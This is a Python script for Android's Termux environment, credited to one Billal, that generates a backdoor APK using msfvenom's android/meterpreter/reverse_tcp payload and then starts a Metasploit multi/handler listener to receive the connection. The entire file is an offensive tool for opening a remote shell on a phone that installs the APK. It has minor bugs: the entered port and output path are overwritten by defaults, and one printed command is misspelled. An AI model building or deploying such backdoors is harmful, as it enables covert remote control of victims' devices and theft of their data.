#_*_coding=UTF-8_*_

# tolong jangan di recode ya kak
# hargai usaha saya ^_^

import os,time,requests,json,sys
from sys import exit
def show(type="",text=""):
	if type=="info":
		print ("  \033[34;1m[\33[33;1mINFO\033[34;1m]: "+str(text))
	elif type=="error":
		print ("  \033[34;1m[\033[31;1mERROR\033[34;1m]: "+str(text))
	elif type=="sukses":
		print ("  \033[34;1m[\033[32;1mSUCCESS\033[34;1m]: "+str(text))
	elif type=="command":
		print ("  \033[34;1m[\033[32;1mCOMMAND\033[34;1m]: "+str(text))
def check_version_python():
	if sys.version[0]=="2":
		show("error","\033[31;1mPlease use python 3.7\033[0m")
		exit()
	else: pass
def loading(mode="",text="",timeout="",range=""):
	# Default timeout
	timeout=int(1)
	# Loading Mode 1
	if mode==int(1):
		m="|/-\|"
		for a in m:
			sys.stdout.write("\r \033[34;1m [\033[33;1m%s\033[34;1m] %s"%(a,text))
			sys.stdout.flush()
			time.sleep(float(timeout))

	# Running Text Mode
	elif mode==int(2):
		for a in text+"\n":
			sys.stdout.write(a)
			sys.stdout.flush()
			time.sleep(float(timeout))
def check_ip():
	try:
		r=requests.get("https://billal-server.000webhostapp.com/api/ipscanner.php?url=google.com")
		ip="\033[32;1m"+json.loads(r.text)["myip"]
	except requests.exceptions.ConnectionError:
		ip="\033[31;1mUnknown"
	return "".join(ip)

def run_msf(lhost,lport):
	try:
		open("/data/data/com.termux/files/usr/bin/msfconsole")
		pass
	except:
		show("error","\033[31;1mMsfconsole not found\033[0m")
		exit()
	show("info","\033[33;1mCommands MSFCONSOLE\n \033[34;1m       : \033[33;1mPlease Copy Commands\033[0m\n")
	show("command","\033[32;1muse multi/handler\033[0m")
	show("command","\033[32;1mset payload android/meterpreter/reverse_tcp\033[0m")
	show("command","\033[32;1mset LHOST %s\033[0m"%(lhost))
	show("command","\033[32;1mser LPORT %s\033[0m"%(lport))
	show("command","\033[32;1mexploit\033[0m")
#	print ("
	time.sleep(5)
	os.system("msfconsole")

def create(lhost,lport="",out=""):
	try:
		open("/data/data/com.termux/files/usr/bin/msfvenom")
		pass
	except:
		show("error","\033[31;1mMsfvenom not found\033[0m")
		exit()
        # Default LPORT
	lport="8080"
        # Default OUTPUT
	out="/sdcard/backdoor.apk"
	loading(1,"\033[32;1mPlease Wait To Creating Backdoor\033[0n")
	try:
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s > /dev/null 2>&1"%(lhost,lport,out))
	except:
		show("error","\033[31;1mFailed making backdoor\033[0m")
		exit()
	print ("")
	show("sukses","\033[32;1mSuccessfully Making Backdoor\033[0m")
	run_msf(lhost,lport)

def check_module():
	os.system("clear")
	loading(1,"\033[32;1mChecking METASPLOIT\033[0m")
	try:
		open("/data/data/com.termux/files/usr/bin/msfconsole")
		print ("")
		show("info","\033[33;1mMetasploit (\033[32;1mINSTALLED\03333;1m)")
	except:
		print ("")
		show("error","\033[33;1mMetasploit (\033[31;1mNOT INSTALLED\033[33;1m)")
	time.sleep(5)

class home:
	def __init__(self):
		check_module()
		self.banner()
		self.choice()
	def banner(self):
		os.system("clear")
		ip=check_ip()
		print ("""\033[31;1m
\033[31;1m       ╔═╗   ╔\033[37;1m╗    ╔╦╗ \033[32;1m Generate
\033[31;1m       ║ ╦   ╠\033[37;1m╩╗   ║║║ \033[32;1m Backdoor
\033[31;1m       ╚═╝   ╚\033[37;1m═╝   ╩ ╩ \033[32;1m Metasploit
\033[37;1m   {\033[33;1mC\033[37;1m}odded   : \033[31;1mBillal
\033[37;1m   {\033[33;1mV\033[37;1m}ersion  : \033[31;1m0.1
\033[37;1m   {\033[33;1mG\033[37;1m}ithub   : \033[31;1mhttps://github.com/billal1412\033[33;1m
================================================\033[32;1m
             © 2019 Billal Fauzan\033[33;1m
================================================\033[37;1m
   Your IP Address: %s\033[0m\n"""%(ip))
	def choice(self):
		show("info","\033[33;1mLHOST required")
		show("info","\033[33;1mLPORT default 8080")
		show("info","\033[33;1mOUTPUT default /sdcard/backdoor.apk")
		print ("\033[37;1m"+40*"="+"\033[0m")
		lhost=input("  \033[34;1m[\033[33;1mCHOICE\033[34;1m]: \033[37;1mLHOST: \033[32;1m")
		show("info","\033[33;1mEnter to choice LPORT default")
		lport=input("  \033[34;1m[\033[33;1mCHOICE\033[34;1m]: \033[37;1mLPORT: \033[32;1m")
		show("info","\033[33;1mEnter to choice OUTPUT default")
		out=input("  \033[34;1m[\033[33;1mCHOICE\033[34;1m]: \033[37;1mOUTPUT: \033[32;1m")
		create(lhost,lport,out)

check_version_python()
home()
